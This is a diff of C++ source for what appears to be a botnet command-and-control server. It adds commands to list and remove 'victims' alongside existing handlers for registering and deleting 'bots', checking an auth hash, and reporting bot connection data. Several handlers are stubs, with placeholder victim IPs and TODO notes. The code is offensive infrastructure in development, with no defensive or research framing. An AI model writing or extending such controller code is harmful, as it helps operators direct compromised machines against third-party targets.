@@ -18,9 +18,13 @@ server::server(io::io_context& io_context, std::uint16_t port)
 	     boost::bind(&server::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
 	    {"[GET_BOTS_DATA]", boost::bind(&server::handleGetClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
 					    boost::placeholders::_3)},
+	    {"[GET_VICTIMS_DATA]", boost::bind(&server::handleGetVictimsData, this, boost::placeholders::_1,
+					       boost::placeholders::_2, boost::placeholders::_3)},
 	    {"[DEL_BOT]", boost::bind(&server::handleRemoveClient, this, boost::placeholders::_1, boost::placeholders::_2,
 				      boost::placeholders::_3)},
 	    {"[ADD_VICTIM]", boost::bind(&server::handleAddVictim, this, boost::placeholders::_1, boost::placeholders::_2,
+					 boost::placeholders::_3)},
+	    {"[DEL_VICTIM]", boost::bind(&server::handleRemoveVictim, this, boost::placeholders::_1, boost::placeholders::_2,
 					 boost::placeholders::_3)},
 	};
 }
@@ -93,7 +97,7 @@ void server::handleGetClientsData(std::string& command, std::vector<std::string>
 	if (!params.size()) return;
 	if (!checkHash_(params[0])) return;
 
-	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Ping]"};
+	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Latency]"};
 	{
 		std::unique_lock<std::mutex> lock(clients_data_m_);
 		for (auto& bot : clients_data_container_) {
@@ -104,6 +108,21 @@ void server::handleGetClientsData(std::string& command, std::vector<std::string>
 			output_params.push_back(std::to_string(bot.second.ping));
 		}
 	}
+	client->send(msg_parser_.genCommand(command, output_params));
+}
+
+void server::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* client) {
+	if (!params.size()) return;
+	if (!checkHash_(params[0])) return;
+
+	std::vector<std::string> output_params = {"1", "[Active_Victims]"};
+
+	std::vector<std::string> victims = {"192.168.0.1", "192.168.0.2", "192.168.0.3", "192.168.0.4", "192.168.0.5"};
+	// TODO:@mark retrieve ^data from real structure
+	for (auto& victim : victims) {
+		output_params.push_back(victim);
+	}
+
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
@@ -118,16 +137,27 @@ void server::handleRemoveClient(std::string& command, std::vector<std::string>& 
 	{
 		std::unique_lock<std::mutex> lock(clients_session_m_);
 		if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
-			// TODO: fix bug when removing bot from hashmap
+			// TODO:@mark fix bug when removing bot from hashmap
 			// clients_sessions_container_.erase(id);
 		}
 	}
 	{
 		std::unique_lock<std::mutex> lock(clients_data_m_);
 		if (clients_data_container_.find(ip) != clients_data_container_.end()) {
+			// TODO:@mark fix same bug possibly
 			// clients_data_container_.erase(ip);
 		}
 	}
+}
+
+void server::handleRemoveVictim(std::string& command, std::vector<std::string>& params, session* client) {
+	if (params.size() < 2) return;
+	if (!checkHash_(params[0])) return;
+
+	auto victim = params[1];
+	PRINT("REMOVING VICTIM: ", victim);
+
+	// TODO:@mark need to remove the given victim
 }
 
 void server::handleAddVictim(std::string& command, std::vector<std::string>& params, session* client) {
@@ -137,7 +167,7 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	std::string victim_ip = params[1];
 
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
-    //TODO: add new victim
+	// TODO:@mark add new victim to structure + check if given ip is valid address
 }
 
 void server::pingClients() {
